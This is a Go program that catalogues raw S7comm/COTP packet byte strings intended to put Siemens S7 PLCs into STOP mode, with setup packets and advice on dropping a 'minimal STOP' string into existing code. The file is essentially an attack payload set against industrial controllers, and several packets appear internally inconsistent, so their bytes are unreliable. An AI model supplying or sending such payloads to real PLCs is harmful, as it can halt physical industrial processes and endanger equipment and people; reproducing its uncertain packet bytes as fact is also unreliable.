package main

import (
	"encoding/hex"
	"fmt"
)

// Different S7 STOP command variants found in various S7 implementations
var stopCommands = map[string]string{
	// Your current command
	"Original": "\x03\x00\x00\x21\x02\xf0\x80\x32\x01\x00\x00\x06\x00\x00\x10\x00\x00\x29\x00\x00\x00\x00\x00\x09\x50\x5f\x50\x52\x4f\x47\x52\x41\x4d",

	// Standard S7-300/400 STOP
	"S7-300/400 STOP": "\x03\x00\x00\x1d\x02\xf0\x80\x32\x01\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x29\x00\x00\x00\x00\x00\x05\x50\x52\x4f\x47",

	// S7-1200/1500 STOP variant
	"S7-1200/1500 STOP": "\x03\x00\x00\x25\x02\xf0\x80\x32\x01\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x28\x00\x00\x00\x00\x00\x00\x00\x00\x09\x50\x5f\x50\x52\x4f\x47\x52\x41\x4d",

	// Minimal STOP command
	"Minimal STOP": "\x03\x00\x00\x19\x02\xf0\x80\x32\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x29\x00\x00\x00\x00\x00",

	// STOP with service ID
	"STOP with SZL": "\x03\x00\x00\x1f\x02\xf0\x80\x32\x01\x00\x00\x00\x00\x00\x0e\x00\x00\x00\x00\x00\x29\x00\x00\x00\x00\x00\x00\x00\xfd\x00\x00\x09",
}

// S7 connection establishment commands (needed before STOP on some PLCs)
var setupCommands = map[string]string{
	// COTP Connection Request
	"COTP Connect": "\x03\x00\x00\x16\x11\xe0\x00\x00\x00\x01\x00\xc0\x01\x0a\xc1\x02\x01\x02\xc2\x02\x01\x00",

	// S7 Communication Setup
	"S7 Setup": "\x03\x00\x00\x19\x02\xf0\x80\x32\x01\x00\x00\x04\x00\x00\x08\x00\x00\xf0\x00\x00\x01\x00\x01\x01\xe0",
}

func main() {
	fmt.Println("=== Alternative S7 STOP Commands ===\n")

	// Display all STOP command variants
	for name, cmd := range stopCommands {
		fmt.Printf("%s:\n", name)
		fmt.Printf("Length: %d bytes\n", len(cmd))
		fmt.Printf("Hex: %X\n", []byte(cmd))
		fmt.Println(hex.Dump([]byte(cmd)))
		fmt.Println()
	}

	// Show setup commands that might be needed
	fmt.Println("\n=== Setup Commands (if needed before STOP) ===\n")
	for name, cmd := range setupCommands {
		fmt.Printf("%s:\n", name)
		fmt.Printf("Hex: %X\n", []byte(cmd))
		fmt.Println()
	}

	// Provide implementation advice
	fmt.Println("\n=== Implementation Notes ===")
	fmt.Println("1. Some PLCs require a COTP connection before accepting S7 commands")
	fmt.Println("2. S7-1200/1500 may use function 0x28 instead of 0x29")
	fmt.Println("3. The 'P_PROGRAM' parameter works on most Siemens PLCs")
	fmt.Println("4. Some PLCs need proper session establishment first")

	fmt.Println("\n=== Testing Different Commands ===")
	fmt.Println("To test these in your code, replace the stop variable with:")
	fmt.Println(`stop := "\x03\x00\x00\x19\x02\xf0\x80\x32\x01\x00\x00\x00\x00\x00\x08\x00\x00\x00\x00\x00\x29\x00\x00\x00\x00\x00"`)
	fmt.Println("(This is the minimal STOP command)")
}
